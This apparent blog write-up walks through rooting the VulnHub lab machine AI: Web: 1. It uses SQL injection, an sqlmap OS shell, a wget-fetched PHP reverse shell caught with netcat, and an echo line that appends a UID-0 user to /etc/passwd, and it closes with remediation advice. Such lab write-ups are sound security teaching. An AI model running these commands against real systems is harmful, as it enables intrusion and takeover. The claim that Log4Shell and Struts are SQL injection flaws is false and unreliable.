# VulnHub AI: Web: 1 — SQLi to Root via Writable /etc/passwd

Look at this, guys!! Who would have thought a simple User ID form would hand over the whole box? AI: Web: 1 is a classic beginner web machine that chains SQL injection, OS shell via sqlmap, file upload, and a world-writable `/etc/passwd` into a full root compromise. Legit one of those VMs that teaches you exactly why input validation and file permissions matter fr fr.

Big thanks to the author for keeping the surface clean and the hints subtle enough to make you actually think.

---

| Field | Value |
|-------|-------|
| **Level** | Easy / Beginner |
| **Target VM** | AI: Web: 1 |
| **Attacker VM** | Kali Linux 2024.x |
| **VulnHub** | https://www.vulnhub.com/entry/ai-web-1,353/ |
| **Techniques** | Web enumeration, SQL injection, sqlmap OS shell, PHP reverse shell upload, writable /etc/passwd privesc |
| **CVEs / CWEs** | CWE-89 (SQL Injection), CWE-434 (Unrestricted File Upload), CWE-732 (World-writable /etc/passwd) |
| **APT Groups** | FIN7 (web app SQLi for initial access), APT41 (web shell deployment), Lazarus Group (file upload for persistence) |

---

## Attack Summary

```
[host-discovery: netdiscover / nmap]
    |
    v
[nmap: 80/tcp HTTP Apache]
    |
    v
[robots.txt => /m3diNf0/ and /se3reTdir777/uploads/]
    |
    v
[dirb /m3diNf0/ => info.php => document root disclosure]
    |
    v
[SQLi in User ID form at /se3reTdir777/]
    |
    v
[sqlmap: dump aiweb1 DB => credentials extracted]
    |
    v
[sqlmap --os-shell => interactive shell as www-data]
    |
    v
[PHP reverse shell upload => nc listener => www-data shell]
    |
    v
[LinEnum: /etc/passwd world-writable]
    |
    v
[echo new root user >> /etc/passwd => su raj]
    |
    v
[ROOT => /root/flag.txt]
```

---

## Methodology

1. Host discovery and target identification on the local network
2. Port scan and service enumeration with Nmap
3. Web enumeration via `robots.txt` and directory brute-force with dirb
4. PHP path disclosure through `info.php`
5. SQL injection identification and exploitation with sqlmap
6. OS shell via `sqlmap --os-shell` using path disclosure
7. PHP reverse shell upload and catch via netcat
8. Linux privilege escalation via world-writable `/etc/passwd`
9. Root flag capture

---

## Step 1 — Identifying the Target

We start with host discovery because we need to know the target IP before doing anything else. On a host-only or bridged lab network, `netdiscover` or `arp-scan` works great for finding live hosts fast.

```bash
# Option 1: arp-scan (fast, recommended for local lab networks)
arp-scan --localnet --ignoredups

# Option 2: netdiscover
netdiscover -r 192.168.13.0/24
```

Target identified: **192.168.13.131**

```bash
# Optional: update /etc/hosts for convenience
echo "192.168.13.131  aiweb1.lab" >> /etc/hosts
```

> **MITRE ATT&CK:** TA0043 Reconnaissance | T1590 Gather Victim Network Information

---

## Step 2 — Reconnaissance and Port Scan

One port, one service. Nmap also fires NSE scripts that grab `robots.txt` automatically.

```bash
nmap -A -T4 -p- 192.168.13.131
```

Expected output:

```
80/tcp open  http  Apache httpd
|_http-robots.txt: 2 disallowed entries
| /m3diNf0/ /se3reTdir777/uploads/
```

Only port 80 is open. Nmap's `http-robots.txt` script already found two disallowed paths. That `robots.txt` is meant to hide stuff from search engines, not from attackers. Bruh, classic mistake.

> **MITRE ATT&CK:** TA0043 Reconnaissance | T1046 Network Service Discovery

---

## Step 3 — Web Enumeration and Path Disclosure

The `robots.txt` gave us two leads. Start with `/m3diNf0/` and look for interesting files.

```bash
dirb http://192.168.13.131/m3diNf0/
```

Expected output:

```
+ http://192.168.13.131/m3diNf0/info.php (CODE:200|SIZE:...)
```

Browse to `/m3diNf0/info.php`. This is a `phpinfo()` page that discloses:

```
Document Root: /home/www/html/web1x443290o2sdf92213
```

Noice. We now have the full document root path, which sqlmap needs later to drop files.

Browse to `http://192.168.13.131/se3reTdir777/` and you'll find a "User ID" input form.

> **Real-world note:** `robots.txt` exposure led to sensitive path disclosure in multiple real-world assessments. Attackers routinely parse it before anything else. Reference: OWASP Testing Guide OTG-INFO-001.

> **MITRE ATT&CK:** TA0043 Reconnaissance | T1083 File and Directory Discovery

---

## Step 4 — SQL Injection Discovery

Test the User ID form at `/se3reTdir777/` with classic SQLi probes:

- Input `1` returns: `First name: admin | Last name: admin` (valid response)
- Input `1'` causes a visible error (unhandled exception)
- Input `1 OR 1=1` returns all records

The parameter is not sanitized. Time to unleash sqlmap.

Capture the POST request with Burp Suite and save it as `req.txt`:

```
POST /se3reTdir777/ HTTP/1.1
Host: 192.168.13.131
Content-Type: application/x-www-form-urlencoded

uid=1
```

> **What is SQL Injection?** User input is concatenated directly into a SQL query without sanitization. The attacker injects SQL syntax to alter the query's logic, dump data, or in some configurations execute OS commands. It maps to OWASP A03:2021 Injection and CWE-89.

> **MITRE ATT&CK:** TA0001 Initial Access | T1190 Exploit Public-Facing Application

---

## Step 5 — Database Dump with sqlmap

```bash
# Identify databases
sqlmap -r req.txt --dbs --batch

# Dump the aiweb1 database
sqlmap -r req.txt -D aiweb1 --dump-all --batch
```

Credentials recovered:

| ID | Username | Password |
|----|----------|----------|
| 1 | t00r | FakeUserPassw0rd |
| 2 | aiweb1pwn | MyEvilPass_f908sdaf9_sadfasf0sa |
| 3 | u3er | N0tThisOneAls0 |

sqlmap also confirms a writable upload path at `/se3reTdir777/uploads/`.

> **MITRE ATT&CK:** TA0006 Credential Access | T1555 Credentials from Password Stores

---

## Step 6 — OS Shell via sqlmap

With the document root path from `info.php`, we can tell sqlmap exactly where to drop its stager:

```bash
sqlmap -r req.txt -D aiweb1 --os-shell
```

When prompted:
- Web application language: **PHP**
- Confirm full path disclosure: **yes**
- Writable path: `/home/www/html/web1x443290o2sdf92213`

An interactive OS shell drops as `www-data`. Rekt.

```bash
# Verify access
id
# uid=33(www-data) gid=33(www-data) groups=33(www-data)

cat /etc/passwd
```

> **MITRE ATT&CK:** TA0002 Execution | T1059.004 Unix Shell

---

## Step 7 — PHP Reverse Shell Upload

sqlmap's stager is handy but limited. Upgrade to a proper reverse shell.

Edit `/usr/share/webshells/php/php-reverse-shell.php`:

```php
$ip = '192.168.13.132';   // your attacker IP
$port = 1234;
```

From the sqlmap OS shell, download it:

```bash
# In the sqlmap OS shell:
wget http://192.168.13.132:8000/php-reverse-shell.php \
  -O /home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads/rshell.php
```

On the attacker machine: start HTTP server + listener:

```bash
# Serve the shell
python3 -m http.server 8000

# Catch the reverse shell
nc -lvp 1234
```

Trigger the shell:

```
http://192.168.13.131/se3reTdir777/uploads/rshell.php
```

Shell received as `www-data`. Stabilize:

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```

> **MITRE ATT&CK:** TA0002 Execution | T1505.003 Web Shell | TA0003 Persistence

---

## Step 8 — Privilege Escalation via Writable /etc/passwd

Run LinEnum to enumerate misconfigurations:

```bash
# On attacker: serve LinEnum
python3 -m http.server 8000

# On target (www-data shell):
cd /tmp
wget http://192.168.13.132:8000/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh
```

LinEnum reports: `/etc/passwd` is **world-writable** (`-rw-rw-rw-`). That is a critical misconfiguration, dude.

> **What is /etc/passwd abuse?** When `/etc/passwd` is writable by non-root users, an attacker can append a new user entry with UID 0 (root), effectively creating a backdoor root account with a known password. This maps to CWE-732.

Generate a password hash:

```bash
openssl passwd -1 -salt user3 pass123
# Output: $1$user3$rAGRVf5p2jYTqtqOW5cPu/
```

Append the new root user:

```bash
echo 'raj:$1$user3$rAGRVf5p2jYTqtqOW5cPu/:0:0::/root:/bin/bash' >> /etc/passwd
```

> **MITRE ATT&CK:** TA0004 Privilege Escalation | T1548 Abuse Elevation Control Mechanism | T1136 Create Account

---

## Step 9 — Root and Flag

```bash
su raj
# Password: pass123

id
# uid=0(root) gid=0(root) groups=0(root)

cd /root
cat flag.txt
```

**(☞ﾟヮﾟ)☞ Got root!! GG no re!!**

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Cracked/Used |
|------|-------|----------|-------------|
| DB Credentials | `t00r:FakeUserPassw0rd` | aiweb1 DB via sqlmap | Login reference |
| DB Credentials | `aiweb1pwn:MyEvilPass_f908sdaf9_sadfasf0sa` | aiweb1 DB via sqlmap | Login reference |
| DB Credentials | `u3er:N0tThisOneAls0` | aiweb1 DB via sqlmap | Login reference |
| Injected root user | `raj:pass123` | /etc/passwd (injected) | su raj -> root |
| Root Flag | see `/root/flag.txt` | `/root/flag.txt` | N/A |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---------|---------------------|-------------|
| 1 | `robots.txt` disclosed sensitive paths | Attackers parse `robots.txt` before any other recon step | Remove internal paths; use web server ACLs instead |
| 2 | Unsanitized User ID input enabled full DB dump via sqlmap | SQLi is the #1 data breach vector (OWASP A03) | Use parameterized queries and prepared statements always |
| 3 | `phpinfo()` page exposed document root and server config | Attackers use path disclosure to drop web shells precisely | Disable phpinfo in production; restrict by IP if needed |
| 4 | `/etc/passwd` world-writable allowed root account injection | This misconfiguration would immediately compromise any Linux host | `chmod 644 /etc/passwd` and audit file permissions regularly |
| 5 | File upload endpoint with no type validation | Web shells deployed via unrestricted upload are a top initial access vector | Validate MIME type, extension, and content; store outside web root |

**Why does this matter outside the lab?**

SQL injection drove some of the largest breaches on record: Heartland Payment Systems (2008, 130M cards), Sony Pictures (2011), and numerous healthcare data breaches. The combination of SQLi plus file write capability maps directly to how FIN7 and Lazarus Group achieve initial foothold in retail and financial environments. The world-writable `/etc/passwd` misconfiguration, while dramatic in a lab, has real analogs: misconfigured container base images and cloud storage buckets with open ACLs lead to equivalent credential injection attacks daily.

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP-ID |
|-------|--------|-----------|--------|
| Reconnaissance | TA0043 | Network Service Discovery | T1046 |
| Reconnaissance | TA0043 | File and Directory Discovery | T1083 |
| Initial Access | TA0001 | Exploit Public-Facing Application | T1190 |
| Execution | TA0002 | Unix Shell via OS Command Injection | T1059.004 |
| Execution | TA0002 | Web Shell | T1505.003 |
| Persistence | TA0003 | Create Account: Local Account | T1136.001 |
| Privilege Escalation | TA0004 | Abuse Elevation Control Mechanism | T1548 |
| Credential Access | TA0006 | Credentials from Password Stores | T1555 |
| Discovery | TA0007 | File and Directory Discovery | T1083 |
| Collection | TA0009 | Data from Local System | T1005 |

> MITRE ATT&CK: https://attack.mitre.org/

---

## Remediation and Containment

### Technical Fixes

1. Replace all SQL string concatenation with parameterized queries or prepared statements in the User ID form.
2. Remove sensitive paths from `robots.txt`; protect them with web server authentication or IP allowlists.
3. Disable or remove `phpinfo()` pages from production; restrict to internal IPs if diagnostics are needed.
4. Restore `/etc/passwd` permissions: `chmod 644 /etc/passwd` and ensure it is owned `root:root`.
5. Implement file upload validation: check MIME type, extension allowlist, content inspection; store files outside the web root.
6. Revoke the `FILE` privilege from the MySQL application user to prevent `INTO OUTFILE` attacks.

### If You Find Something Similar in Your Environment

**Immediate containment:**
- Isolate the web server from the internal network.
- Rotate all database credentials and audit DB user privileges.
- Remove any uploaded web shells and review access logs for the upload path.
- Audit `/etc/passwd` and `/etc/shadow` for unauthorized accounts.

**MITRE D3FEND countermeasures:**
- D3-NI Network Isolation for the compromised web host (T1190)
- D3-PA Process Allow Listing to block web shell execution (T1505.003)
- D3-FCA File Content Analysis to detect uploaded PHP files (CWE-434)
- D3-UAP User Account Permissions audit for world-writable critical files (CWE-732)

### Framework Alignment

**NIST CSF 2.0:**
- Identify (ID.AM): Maintain inventory of web application assets and their permission states.
- Protect (PR.DS-1): Data-at-rest protection; restrict write access to critical OS files.
- Protect (PR.PT-3): Principle of least privilege applied to DB users and file permissions.
- Detect (DE.CM-1): Continuous monitoring for unauthorized account creation and file changes.
- Respond (RS.RP-1): Execute incident response plan upon detection of web shell activity.

**NIST SP 800-53 Rev. 5 Controls:**
- SI-10: Information Input Validation (parameterized queries)
- AC-6: Least Privilege (DB user FILE privilege, OS file permissions)
- CM-7: Least Functionality (disable phpinfo in production)
- AU-12: Audit Record Generation (log all file uploads and DB queries)
- IA-5: Authenticator Management (strong DB credentials)

**CISA Known Exploited Vulnerabilities:**
- No direct CVE match for this custom app; however, SQL injection vulnerabilities affecting popular frameworks (e.g., CVE-2021-44228 Log4Shell, CVE-2017-5638 Apache Struts) are in the CISA KEV catalog.
- Reference: https://www.cisa.gov/known-exploited-vulnerabilities-catalog

**C2M2 (Cybersecurity Capability Maturity Model):**
- Domain: ASSET (Asset, Change, and Configuration Management)
- Practice: Manage IT and OT Asset Inventory
- Target MIL: MIL-2 (managed, documented practices)

---

## Final Thoughts

Thanks to the author of AI: Web: 1 for building a machine that packs five distinct vulnerability classes into a single HTTP service. This is exactly the kind of lab that bridges the gap between "knowing what SQLi is" and "actually chaining it to root."

The `robots.txt` to path disclosure to sqlmap OS shell chain is something you will see replicated in real-world assessments constantly. And the writable `/etc/passwd` is a reminder that Linux file permission hygiene is not optional.

If this walkthrough helped you, share it with your crew and keep hacking!

*Thanks guys!! (❍ᴥ❍ʋ)*

---

*Writeup by [André Henrike](https://medium.com/@mrhenrike) | [União Geek](https://uniaogeek.com.br)*
